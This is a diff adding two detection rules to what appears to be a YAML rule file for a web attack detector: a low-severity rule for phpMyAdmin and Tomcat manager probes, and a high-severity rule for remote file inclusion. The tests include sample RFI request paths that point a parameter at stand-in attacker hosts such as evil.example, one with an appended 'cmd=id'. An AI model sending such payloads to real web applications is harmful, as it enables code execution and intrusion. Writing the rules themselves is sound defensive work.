@@ -150,3 +150,34 @@
   tests:
     match: [{user_agent: "sqlmap/1.8.11#stable (https://sqlmap.org)"}, {user_agent: "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)"}]
     no_match: [{user_agent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/130.0"}]
+
+- id: web-admin-panel-probe
+  name: ADMIN_PANEL_PROBE
+  title: Probe for database / admin panels
+  type: web
+  severity: low
+  mitre: [T1595.003]
+  pattern: '(?:^|/)(?:phpmyadmin[\w.\-]*|pma|myadmin|mysqladmin|dbadmin|sqladmin)(?:/|$)|/scripts/setup\.php\b|/manager/html\b'
+  description: >
+    Bots that look for phpMyAdmin, database admin tools or the Tomcat manager. Low on its
+    own: it is reconnaissance, and a site that really hosts one of these will see its own
+    admins here too (disable the rule with --rules-dir if so).
+  false_positives: ["A site that hosts phpMyAdmin or the Tomcat manager on purpose"]
+  tests:
+    match: ["//phpMyAdmin-2.8.2.3/scripts/setup.php", "/pma/index.php", "/manager/html", "/mysqladmin/"]
+    no_match: ["/blog/how-to-use-phpmyadmin-safely", "/pmax/report", "/docs/setup.php"]
+
+- id: web-remote-file-inclusion
+  name: REMOTE_FILE_INCLUSION
+  title: Remote file inclusion attempt
+  type: web
+  severity: high
+  mitre: [T1190]
+  block: inbound
+  pattern: '[?&][\w\[\]%.\-]+=(?:https?|ftp)://[^&\s?#]+\?(?:&|$)'
+  description: >
+    A query parameter set to a remote URL that ends in a bare '?', the classic trick to make
+    a vulnerable include() load attacker code and cut off the extension the app appends.
+  tests:
+    match: ["/index.php?n=http://evil.example/pizza.htm?", "/index.php?mosConfig_absolute_path=http://x.example/tool.gif?&cmd=id"]
+    no_match: ["/login?next=https://shop.example/cart?item=4", "/go?url=https://example.org/page", "/search?q=http"]
